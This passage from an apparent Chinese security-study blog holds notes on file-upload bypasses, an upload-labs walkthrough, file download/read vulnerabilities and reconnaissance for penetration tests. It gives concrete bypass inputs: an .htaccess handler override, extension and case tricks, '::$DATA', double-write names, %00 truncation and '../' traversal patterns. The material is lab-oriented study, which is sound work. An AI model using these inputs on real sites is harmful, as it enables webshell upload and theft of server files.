href="https://github.com/TuuuNya/fuzz_dict">https://github.com/TuuuNya/fuzz_dict</a><br><a href="https://github.com/jas502n/fuzz-wooyun-org">https://github.com/jas502n/fuzz-wooyun-org</a><br>总之就是防止脚本后缀被匹配出来,思维要灵活,善于思考善于总结,探讨多种方法。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23&vd_source=d32bce54780cf3d9710df43274886fde">数据溢出防匹配绕过演示(感觉类似于垃圾数据):18:00-28:30</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23&vd_source=d32bce54780cf3d9710df43274886fde">符号变异防匹配绕过演示:28:12-45：50</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23&vd_source=d32bce54780cf3d9710df43274886fde">数据截断防匹配绕过演示:45：52-53:30</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23&vd_source=d32bce54780cf3d9710df43274886fde">重复数据结合”垃圾数据”防匹配绕过演示:57:00-1:10:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23&vd_source=d32bce54780cf3d9710df43274886fde">fuzz演示:1:15:00-</a></p>
<h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p><img src="https://pic.imgdb.cn/item/65236d19c458853aef3257ed.png" alt="图五" title="如何优雅地防护?"><br>说明<br>1、函数，参考upload pass16,那个geiimage什么的,必须是图片才可以上传。<br>2、后缀用白名单只能jpg，文件名用黑名单，只有要出现php的字眼就拦截。<br>3、先判断有无WAF,若有则先绕过再判断有无上传漏洞。</p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>记录upload-labs通关过程</title>
    <url>/2023/10/08/wjscPractixe/</url>
    <content><![CDATA[<p>使用upload-labs靶场<br>环境：WIN10，php5.3.29</p>
<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>代码审计,为js脚本,明显的前端验证(形同虚设),直接禁用js即可。也可以使用第二关的思路,直接抓包,保证MIME值为png&#x2F;jpg&#x2F;gif的类型即可。</p>
<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>代码审计,发现仅仅是验证MIME属性。直接抓包,保证MIME值为png&#x2F;jpg&#x2F;gif的类型即可。</p>
<h2 id="Pass-03（！）"><a href="#Pass-03（！）" class="headerlink" title="Pass-03（！）"></a>Pass-03（！）</h2><p>代码审计,发现过滤类型为黑名单验证,但不完整。php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml等都会被当成php代码执行,所以上传一个这类类型的文件即可。</p>
<h2 id="Pass-04（！）"><a href="#Pass-04（！）" class="headerlink" title="Pass-04（！）"></a>Pass-04（！）</h2><p>发现上述类型的也被列入了黑名单,那么可以使用.htaccess(配置文件)文件上传。在upload-labs目录下创建一个.htaccess文件,内容为</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;shana&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure>
<p>意思就是如果文件里面有一个名字为”shana”的文件，他就会被解析成.php。先上传一个1.png文件，然后上传这个.htaccess，再访问1.png,完成。<br>(这里不知道为什么,按照迪的步骤来,就是不成功)</p>
<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>运用到了一点点php代码审计。<br><img src="https://pic.imgdb.cn/item/6523bbf2c458853aef50cb47.png" alt="图一" title="pass5部分代码"><br>如图,此代码对于上传的文件的验证时是先去掉末尾的一个点,再去掉末尾以及首部的空格。那么我们可以利用此处代码的瑕疵。<br><img src="https://pic.imgdb.cn/item/6523bce2c458853aef514ab8.png" alt="图二" title="pass5 burp抓包"><br>burp抓包发到重发器,将filename的字段值改为1.PHP. .,之后send,发现成功绕过上传。<br>访问此文件地址:<br><img src="https://pic.imgdb.cn/item/6523bce7c458853aef514ba4.png" alt="图三" title="pass5 通关界面"></p>
<h2 id="Pass-06（！）"><a href="#Pass-06（！）" class="headerlink" title="Pass-06（！）"></a>Pass-06（！）</h2><p>继续代码审计,发现并没有大小写过滤<br><img src="https://pic.imgdb.cn/item/65240c96c458853aef68d0d4.png" alt="图四" title="pass6部分代码"><br>那么直接上传php文件,抓包并把filename值后缀改为.Php看下行不行。<br><img src="https://pic.imgdb.cn/item/6523c1dcc458853aef5395e6.png" alt="图五" title="pass6 burp抓包"><br>提示成功。<br>但是此时我访问不了这个文件,报错显示<br><img src="https://pic.imgdb.cn/item/6523c23ac458853aef53e638.png" alt="图六" title="pass6 "><br>不知道什么原因,望指点,谢谢。</p>
<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>接着代码审计,发现没有空格过滤<br><img src="https://pic.imgdb.cn/item/65240cc7c458853aef68d75e.png" alt="图七" title="pass7部分代码"><br>那么直接上传php文件,抓包并把filename值后缀改为.php<br><img src="https://pic.imgdb.cn/item/65240d7bc458853aef68f010.png" alt="图八" title="pass7burp抓包"><br>访问此文件地址,成功解析。</p>
<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>接着代码审计,发现没有文末.过滤<br><img src="https://pic.imgdb.cn/item/65240e19c458853aef69029e.png" alt="图九" title="pass8部分代码"><br>那么直接上传php文件,抓包并把filename值后缀改为”.php.”<br><img src="https://pic.imgdb.cn/item/65240e7ac458853aef6911d0.png" alt="图十" title="pass8burp抓包"><br>访问此文件地址,成功解析,对应的文件目录出现上传的文件。<br><img src="https://pic.imgdb.cn/item/65240f28c458853aef69318f.png" alt="图十一" title="pass8结果"></p>
<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>代码审计,发现并没有::$DATA过滤<br><img src="https://pic.imgdb.cn/item/6524f3d8c458853aef99af74.png" alt="图十二" title="pass9部分代码"><br>直接抓包在burp修改即可。在filename字段值添加::$DATA即可。<br><img src="https://pic.imgdb.cn/item/6524f660c458853aef9aedcb.png" alt="图十三" title="pass9burp抓包"><br>发现文件成功上传至指定目录,访问这个文件也可以正常执行php代码。<br><img src="https://pic.imgdb.cn/item/6524f674c458853aef9af2a1.png" alt="图十四" title="pass9结果"></p>
<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>与Pass-5相同。</p>
<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>代码审计,发现将匹配到的黑名单的名字进行空串替换,由于其只是替换一次,没有循环判断。<br><img src="https://pic.imgdb.cn/item/6524f7f7c458853aef9b7c55.png" alt="图十五" title="pass11部分代码"><br>所以直接抓包将filename值改为.pphphp即可。<br><img src="https://pic.imgdb.cn/item/6524f803c458853aef9b7df7.png" alt="图十六" title="pass11burp抓包"><br>发现文件成功上传至指定目录,访问这个文件也可以正常执行php代码。</p>
<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>代码审计,发现此处换成了白名单验证,且提交方法为GET,更难绕过,但是发现是代码存在一个”save_path”<br>那么可以使用%00截断。如:a.php.txt是txt类型文件,但是a.php%00.txt是一个php类型文件。<br><img src="https://pic.imgdb.cn/item/6524fb68c458853aef9ccdde.png" alt="图十七" title="pass12部分代码"><br>直接抓包修改,如图所示:<br><img src="https://pic.imgdb.cn/item/6524fbe5c458853aef9d0143.png" alt="图十八" title="pass12burp抓包"><br>发现文件成功上传至指定目录,访问这个文件也可以正常执行php代码。</p>
<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>代码审计,发现此处换成了白名单验证,且提交方法为POST,更难绕过,但是发现是代码存在一个”save_path”<br><img src="https://pic.imgdb.cn/item/6524fca0c458853aef9d9ee2.png" alt="图十九" title="pass13部分代码"><br>然后是和Pass-12一样思路,只不过这里为POST方法提交数据,那么就是0x00截断。<br>直接抓包修改,如图所示,post方式不会自行解码，所以要对%00进行urldecode编码:<br><img src="https://pic.imgdb.cn/item/6524fdf3c458853aef9e2e36.png" alt="图二十" title="pass13burp抓包"><br>发现文件成功上传至指定目录,访问这个文件也可以正常执行php代码。</p>
]]></content>
      <categories>
        <category>文件操作安全</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>文件下载|读取</title>
    <url>/2023/10/15/wenjianxiazai/</url>
    <content><![CDATA[<h2 id="文件下载-读取"><a href="#文件下载-读取" class="headerlink" title="文件下载|读取"></a>文件下载|读取</h2><p><img src="https://pic.imgdb.cn/item/652ba885c458853aef8c2071.png" alt="文件下载与读取" title="文件下载与读取"><br>1.文件被解析，则是文件包含漏洞<br>2.显示源代码，则是文件读取漏洞<br>3.提示文件下载，则是文件下载漏洞<br>两篇文章了解文件下载|读取漏洞:<br><a href="https://blog.csdn.net/qq_56414082/article/details/129861894">https://blog.csdn.net/qq_56414082/article/details/129861894</a><br><a href="https://blog.csdn.net/Gherbirthday0916/article/details/130214037">https://blog.csdn.net/Gherbirthday0916/article/details/130214037</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=31&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">本地小案例去了解此类漏洞:5:00</a><br>1、主要是在存在下载文件功能的网站利用此类漏洞去下载用户的敏感或日常文件。<br>2、如何知道某个文件的路径?<br>(1)、可以利用扫描工具爬行或扫描地址(如御剑)<br>(2)、在下载好的文件代码中去分析路径和包含文件获取。<br>#文件名，参数值，目录符号!!!<br>read.xxx?filename&#x3D;<br>down.xxx?filename&#x3D;<br>readfile.xxx?file&#x3D;<br>downfile.xxx?file&#x3D;<br>..&#x2F; ..\ .\ .&#x2F;等<br>%00 ? %23 %20 .等<br>&amp;readpath&#x3D;、&amp;filepath&#x3D;、&amp;path&#x3D;、&amp;inputfile&#x3D;、&amp;url&#x3D;、&amp;data&#x3D;、&amp;readfile&#x3D;、&amp;menu&#x3D;、META-INF&#x3D; 、<br>WEB-INF<br>在网址中看到这些参数值要注意,可以判断是否存在此类漏洞。</p>
<h3 id="具体实例分析"><a href="#具体实例分析" class="headerlink" title="具体实例分析"></a>具体实例分析</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=31&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">javaweb实例演示:26:00</a><br>明确:<br>1、下载漏洞在哪里测试?–肯定是存在下载功能的网站<br>2、下载漏洞怎么判断存在?–需要注意的是有的时候需要加密<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=31&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">buuojCTF考题分析:40:00</a><br>1、修改提交方式测试-读取 WEB 配置文件 WEB-INF&#x2F;web.xml<br>2、访问读取对应地址-访问读取 flag 对应 class 文件-（WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;ctf&#x2F;FlagController.class）<br>题目整理在:<a href="https://www.yuque.com/weiker/xiaodi/acreedoyq3ecx85r">https://www.yuque.com/weiker/xiaodi/acreedoyq3ecx85r</a><br>下载或文件读取漏洞期望得到的文件：<br>对应文件：配置文件（数据库，平台，各种等）<br>常见敏感文件:<br><img src="https://pic.imgdb.cn/item/652ca7ecc458853aef844f0c.png" alt="敏感文件" title="常见敏感文件"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=31&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">百度杯考题分析:56:00</a><br>1、MVC模型:是模型（model）、视图（view）、控制器（controller）三层架构的设计模式，用于把前端页面的展现与后端业务分离。<br>2、看到module想到文件读取或下载。<br>具体了解:<a href="https://blog.csdn.net/weixin_68107783/article/details/127255910">https://blog.csdn.net/weixin_68107783/article/details/127255910</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=31&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">小米路由器实例–文件读取演示:1:12:00</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、学到了java的WEB-INF&#x2F;web.xml文件和module能够调用一个功能模块，可以实现文件读取<br>2、读取Nginx中的配置文件，来得知该题具有目录跨越漏洞实现文件下载<br>3、文件包含、下载|读取三者其实有异曲同工之妙,打靶场时,发现有的文件包含的题目也需要使用..&#x2F;符号去遍历目录,读取一个文件。</p>
]]></content>
      <categories>
        <category>文件操作安全</category>
      </categories>
      <tags>
        <tag>文件操作安全</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之信息收集（一）</title>
    <url>/2023/09/17/xinxishoudi/</url>
    <content><![CDATA[<h2 id="信息收集（一）"><a href="#信息收集（一）" class="headerlink" title="信息收集（一）"></a>信息收集（一）</h2><h3 id="定义（把在网上可以测试的点全部找出来）"><a href="#定义（把在网上可以测试的点全部找出来）" class="headerlink" title="定义（把在网上可以测试的点全部找出来）"></a>定义（把在网上可以测试的点全部找出来）</h3><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">信息收集是指通过各种方式获取所需要的信息。信息收集是进行渗透测试的第二步（第一步是前期的一个交互，不过目前<br>大部分是灰盒或者黑盒测试，白盒测试较少，交互也就比较少，主要还是要靠自己对信息进行收集），也是关键的一步。<br>信息收集工作的好坏，会影响整个渗透测试流程的进行。收集的信息越多后期可进行测试的目标就越多。<br></code></pre></td></tr></table></figure>
<h3 id="了解cdn"><a href="#了解cdn" class="headerlink" title="了解cdn"></a>了解cdn</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">上网搜索得到的定义：CDN 是构建在数据网络上的一种分布式的内容分发网。 CDN 的作用是采用流媒体服务器集群技术，<br>克服单机系统输出带宽及并发能力不足的缺点，可极大提升系统支持的并发流数目，减少或避免单点失效带来的不良影响。<br>自己理解的：其实就是一个服务公司开发的一个站点，它要面向全国甚至全球网民提供服务，但是它的主站点只有一个，<br>那么距离它近的肯定访问速度较快；反之距离它远的访问速度就慢。这时候就配置cdn服务，相当于在各地设一个分站点，<br>由站长管理，利用缓存，提前存此网站的资源，等到用户访问的时候直接转发此结点的内容即可。但是，配置cdn服务开销<br>挺大的，所以配置时要考虑地区用户数量因素。<br></code></pre></td></tr></table></figure>
<h4 id="cdn的绕过"><a href="#cdn的绕过" class="headerlink" title="cdn的绕过"></a>cdn的绕过</h4><figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm">配置好cdn后，用户发送的请求大多会被分站点响应，从而导致ping得到的响应并非来自主站，探索的<span class="hljs-built_in">ip</span>地址也并非主站，<br>那么此时我们要绕过cdn，获取主站的<span class="hljs-built_in">ip</span>。<br></code></pre></td></tr></table></figure>
<h4 id="cdn绕过的方法"><a href="#cdn绕过的方法" class="headerlink" title="cdn绕过的方法"></a>cdn绕过的方法</h4><h5 id="1、超级ping"><a href="#1、超级ping" class="headerlink" title="1、超级ping"></a>1、超级ping</h5><p> <a href="https://ping.chinaz.com/">超级ping</a></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">利用配置域名时的漏洞，通常是为www这个二级域名配置cdn服务，如：<br>www.baidu.<span class="hljs-keyword">com</span>与baidu.<span class="hljs-keyword">com</span>，我们ping这个baidu.<span class="hljs-keyword">com</span>在大多数情况下是可以探索到主站ip的。<br></code></pre></td></tr></table></figure>
<h5 id="2、邮件加社会工程学"><a href="#2、邮件加社会工程学" class="headerlink" title="2、邮件加社会工程学"></a>2、邮件加社会工程学</h5><figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm">右键查看右键源码，可以看到发送端的<span class="hljs-built_in">ip</span>。这时候，我们再进入目标的网站，拉到最底部，<br>看看备案是在哪个省份的，接着再超级ping，若ping到的<span class="hljs-built_in">ip</span>就是那个省份，那么这很大可能就是主站<span class="hljs-built_in">ip</span>。<br></code></pre></td></tr></table></figure>
<h5 id="3、黑暗引擎"><a href="#3、黑暗引擎" class="headerlink" title="3、黑暗引擎"></a>3、黑暗引擎</h5><p><a href="https://www.shodan.io/">傻蛋</a><br><a href="https://www.zoomeye.org/">zoomeye</a><br><a href="https://fofa.info/">fofa</a></p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm">此类搜索引擎是实时更新的，功能更加强大。可以扫<span class="hljs-built_in">ip</span>，扫域名，甚至字符、文字等。<br></code></pre></td></tr></table></figure>
<h4 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h4><p><a href="https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&ch=5&tn=25017023_2_dg&wd=cdn&oq=%25E6%25B8%2597%25E9%2580%258F%25E6%25B5%258B%25E8%25AF%2595%25E4%25B9%258B%25E4%25BF%25A1%25E6%2581%25AF%25E6%2594%25B6%25E9%259B%2586&rsv_pq=c697402c00278774&rsv_t=1b340NYTw8y/B0kHgxivY4eKF97GyKwrMWewkfO9DhYekTM5sEiMZWd9mvmH8vWOzF/kTQ&rqlang=cn&rsv_enter=1&rsv_dl=tb&rsv_btype=t&inputT=1203&rsv_sug3=22&rsv_sug1=15&rsv_sug7=100&rsv_sug2=0&rsv_sug4=1203">什么是cdn？</a><br><a href="https://blog.csdn.net/weixin_52180702/article/details/125747433">渗透测试中的信息收集是什么意思</a></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之信息收集（二）</title>
    <url>/2023/09/17/xinxishoujiEr/</url>
    <content><![CDATA[<h2 id="信息收集（二）"><a href="#信息收集（二）" class="headerlink" title="信息收集（二）"></a>信息收集（二）</h2><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">！！！写在前面：信息收集小工具，途径如下<br></code></pre></td></tr></table></figure>
<p><a href="https://zhuanlan.zhihu.com/p/529487307">信息收集思路&amp;工具</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">流程如下，图片来源于网络，侵删<br></code></pre></td></tr></table></figure>
<p><img src="/img/liucheng.png" alt="信息收集的流程" title="流程"></p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight scss"><table><tr><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>、web模块重点还是无cdn的情况，因为若有cdn，绕过后，就来到无cdn的情况。<br>无cdn的情况，重点又来到了下面说的站点搭建。(以下介绍的都以无cdn为前提)。<br><span class="hljs-number">2</span>、网站web没问题，可以对系统进行安全测试，系统没问题，可以对第三方应用<br>进行安全测试。（拿下系统权限，则网站也可以轻轻松松拿下啦！）<br></code></pre></td></tr></table></figure>
<h4 id="CMS识别技术"><a href="#CMS识别技术" class="headerlink" title="CMS识别技术"></a>CMS识别技术</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><figure class="highlight objectivec"><table><tr><td class="code"><pre><code class="hljs objectivec"><span class="hljs-built_in">CMS</span>（Content Management System）即内容管理系统，是一个用于管理网站内容的软件。在互联网上，有很多不同的<br><span class="hljs-built_in">CMS</span>，如WordPress、Joomla、Drupal等等。而<span class="hljs-built_in">CMS</span>识别就是通过特定工具或脚本来判断目标网站所使用的<span class="hljs-built_in">CMS</span>类型。<br></code></pre></td></tr></table></figure>
<h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><figure class="highlight objectivec"><table><tr><td class="code"><pre><code class="hljs objectivec">whatweb、w3af、<span class="hljs-built_in">CMSmap</span><br></code></pre></td></tr></table></figure>
<h4 id="源码获取技术"><a href="#源码获取技术" class="headerlink" title="源码获取技术"></a>源码获取技术</h4><h5 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h5><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">源代码抓取是一种从互联网上获取信息的方法。它通过获取网页的源代码，分析其中的<span class="hljs-selector-tag">HTML</span>标签、CSS样式和JavaScript<br>脚本等内容，从而提取出所需的信息<br></code></pre></td></tr></table></figure>
<h5 id="源码获取方式"><a href="#源码获取方式" class="headerlink" title="源码获取方式"></a>源码获取方式</h5><figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.直接获取网页源代码：通过HTTP请求获取网页源代码，然后对其进行解析和处理。<br><span class="hljs-number">2</span>.使用第三方库：如Python中的<span class="hljs-keyword">BeautifulSoup、Scrapy等库，可以方便地进行源代码抓取。</span><br><span class="hljs-keyword"></span><span class="hljs-number">3</span>.使用工具软件：如Fiddler、Charles等工具，可以监控和分析HTTP请求，获取网页源代码。<br></code></pre></td></tr></table></figure>
<h4 id="架构信息获取-即判断操作系统类型"><a href="#架构信息获取-即判断操作系统类型" class="headerlink" title="架构信息获取(即判断操作系统类型)"></a>架构信息获取(即判断操作系统类型)</h4><h5 id="架构信息获取方式"><a href="#架构信息获取方式" class="headerlink" title="架构信息获取方式"></a>架构信息获取方式</h5><figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada"><span class="hljs-number">1</span>．Nmap扫描识别端口和OS的类型。<br><span class="hljs-number">2</span>．网站区分大小写判断系统。<br><span class="hljs-number">3</span>．脚本识别数据库 — asp+<span class="hljs-keyword">Access</span>；PHP+MySQL；aspx+mssql；jsp+mssql/orcale；Python+mogodb。<br><span class="hljs-number">4</span>．os识别数据库 — windows才有<span class="hljs-keyword">Access</span>+sqlserver。<br><span class="hljs-number">5</span>．端口扫描 — 端口号对应不同的数据库。<br><span class="hljs-number">6</span>．Nmap扫描第三方平台和软件—phpmyadmin。<br></code></pre></td></tr></table></figure>

<h3 id="站点搭建"><a href="#站点搭建" class="headerlink" title="站点搭建"></a>站点搭建</h3><h4 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h4><h5 id="搭建习惯-目录型站点"><a href="#搭建习惯-目录型站点" class="headerlink" title="搭建习惯-目录型站点"></a>搭建习惯-目录型站点</h5><figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">意思就是当我们打开一个网站后，如ski<span class="hljs-selector-class">.bku</span><span class="hljs-selector-class">.edu</span>.cn，假设其路径为D:\www\root（这是一套程序）；现在若探测到还有<br>一个网址，如ski<span class="hljs-selector-class">.bku</span><span class="hljs-selector-class">.edu</span>.cn\bbt（这又是另一套程序，两套程序有两种漏洞形式），那么其路径就是是D:\www\bbt。<br>若不清楚ski<span class="hljs-selector-class">.bku</span><span class="hljs-selector-class">.edu</span>.cn用什么框架搭建的，我们可以探测ski<span class="hljs-selector-class">.bku</span><span class="hljs-selector-class">.edu</span>.cn\bbt（甚至是abc目录，kkk目录，通过目<br>录扫描工具爬行），只要我探测到一个，那么我们就可以从这个点渗透（查找这个框架有什么漏洞）。<br></code></pre></td></tr></table></figure>
<h5 id="搭建习惯-端口类站点"><a href="#搭建习惯-端口类站点" class="headerlink" title="搭建习惯-端口类站点"></a>搭建习惯-端口类站点</h5><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">与第一种类似，只不过这种是通过端口探测去访问页面。（端口扫描）<br></code></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">前两种站点为什么一个会影响另一个呢？因为这两套程序本质都运行在一个服务器上，所以一个出了问题肯定会影响另一个（网站）。<br></code></pre></td></tr></table></figure>
<h5 id="搭建习惯-子域名站点"><a href="#搭建习惯-子域名站点" class="headerlink" title="搭建习惯-子域名站点"></a>搭建习惯-子域名站点</h5><figure class="highlight dos"><table><tr><td class="code"><pre><code class="hljs dos">与前两种类似，都是找不同的程序，获取更多机会渗透。但是这种是通过修改二级域名来获取不同的程序，如为www.baiw.<span class="hljs-built_in">net</span>与<br>bbs.baiw.<span class="hljs-built_in">net</span>；而且这两套程序可能不在同一个服务器上面的。此时<span class="hljs-built_in">ping</span>一下，若收到IP相同的响应，则在同一个服务器上；<br>若在同一网段上（若<span class="hljs-number">123</span>.<span class="hljs-number">103</span>.<span class="hljs-number">19</span>.<span class="hljs-number">198</span>与<span class="hljs-number">123</span>.<span class="hljs-number">103</span>.<span class="hljs-number">19</span>.<span class="hljs-number">196</span>），就涉及到内网了。<br></code></pre></td></tr></table></figure>
<h5 id="搭建习惯-类似域名站点（对比较正规网站去做较有意义）"><a href="#搭建习惯-类似域名站点（对比较正规网站去做较有意义）" class="headerlink" title="搭建习惯-类似域名站点（对比较正规网站去做较有意义）"></a>搭建习惯-类似域名站点（对比较正规网站去做较有意义）</h5><figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm">若对某些不同的域名（一般是顶级域名不同）访问，出现相同的网站，其实就是多个域名指向了同一个<span class="hljs-built_in">ip</span>，可以分别对这些域名进<br>以上三种操作。但是别人是不会告诉你他有几个后缀（域名），得靠自己去猜（优先改顶级域名，如<span class="hljs-meta">cn</span>、com、net、org）。<br><span class="hljs-number">1</span>、站长工具-- SEQ综合查询--备案信息查询。<br><span class="hljs-number">2</span>、百度、Google等搜索引擎搜目标官网。<br></code></pre></td></tr></table></figure>
<h5 id="搭建习惯-旁注-c段站点"><a href="#搭建习惯-旁注-c段站点" class="headerlink" title="搭建习惯-旁注, c段站点"></a>搭建习惯-旁注, c段站点</h5><figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm">旁注：同服务器，不同站点。多个网站放在同一个服务器上，其中一个网站是自己的目标。<br>前提条件：有多个服务器站点。<br><span class="hljs-symbol">eg:</span>若<span class="hljs-number">192</span>.<span class="hljs-number">100</span>.<span class="hljs-number">8</span>.<span class="hljs-number">123</span>为服务器的<span class="hljs-built_in">ip</span>地址，上面有www.a.com、www.b.com、.......，假<br>设我想渗透b站点，但是无从下手，那么我可以先去渗透除b外的站点，再跳到b。<br>通过<span class="hljs-built_in">ip</span>查旁注：直接搜旁注查询。<br></code></pre></td></tr></table></figure>
<figure class="highlight dns"><table><tr><td class="code"><pre><code class="hljs dns">c段：同网段不同服务器不同站点。较麻烦，难度较高。<br>前提条件：独立站点服务器。<br>eg:若<span class="hljs-number">192.100.8.123</span>为服务器的ip地址，上面有www.a.com、www.b.com、.......，同<br>时<span class="hljs-number">192.100.8.121</span>是同网段的另一个服务器ip，上面有www.c.com、www.d.com、.......<br>假设我想获得b站点的权限，先旁注，却发现无法提权，那么这时候就要考虑c段，即是，对<br>它的同网段下的另一个服务器下的站点进行提权，进而获取到这个服务器（<span class="hljs-number">192.100.8.121</span>）<br>的权限，在获取<span class="hljs-number">192.100.8.123</span>的权限，最后获得这个服务器下b站点的权限。<br></code></pre></td></tr></table></figure>
<p>演示：<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=7&vd_source=d32bce54780cf3d9710df43274886fde">旁注(51:00处)</a></p>
<h5 id="搭建习惯-搭建软件特征站点"><a href="#搭建习惯-搭建软件特征站点" class="headerlink" title="搭建习惯-搭建软件特征站点"></a>搭建习惯-搭建软件特征站点</h5><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">通过发现搭建软件的安全问题来渗透某个网站。<br></code></pre></td></tr></table></figure>
<h4 id="WAF防护分析"><a href="#WAF防护分析" class="headerlink" title="WAF防护分析"></a>WAF防护分析</h4><h5 id="什么是WAF应用"><a href="#什么是WAF应用" class="headerlink" title="什么是WAF应用?"></a>什么是WAF应用?</h5><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs"> 用以解决诸如防火墙一类传统设备束手无策的Web应用安全问题。与传统防火墙不同，WAF工作在应用层，因此对Web应用防护具有先天<br> 的技术优势。基于对Web应用业务和逻辑的深刻理解，WAF对来自Web应用程序客户端的各类请求进行内容检测和验证，确保其安全性与<br> 合法性，对非法的请求予以实时阻断，从而对各类网站站点进行有效防护。<br>（个人性质的网站，一般软件形式，企业性质的，一般硬件形式）<br></code></pre></td></tr></table></figure>
<h5 id="如何快速识别WAF"><a href="#如何快速识别WAF" class="headerlink" title="如何快速识别WAF?"></a>如何快速识别WAF?</h5><figure class="highlight scss"><table><tr><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>、<span class="hljs-built_in">wafw00f</span>(kali自带)。<br><span class="hljs-number">2</span>、打开控制台看响应返回的数据包。<br></code></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/qq_53079406/article/details/122961195">kali下使用wafw00f</a></p>
<h5 id="识别WAF对于安全测试的意义"><a href="#识别WAF对于安全测试的意义" class="headerlink" title="识别WAF对于安全测试的意义?"></a>识别WAF对于安全测试的意义?</h5><figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>、识别出若有waf，可以提前做好渗透前准备。<br><span class="hljs-number">2</span>、若识别出有waf，不要直接去扫这个网站的<span class="hljs-built_in">ip</span>，会被拉黑。<br></code></pre></td></tr></table></figure>

<h3 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h3><p><a href="https://www.yii666.com/blog/665657.html">架构信息获取</a><br><a href="https://baijiahao.baidu.com/s?id=1764373362445877893&wfr=spider&for=pc">源码获取方式</a><br><a href="https://baijiahao.baidu.com/s?id=1764373362445877893&wfr=spider&for=pc">CMS识别</a></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之信息收集（三）</title>
    <url>/2023/09/18/xinxishoujiThree/</url>
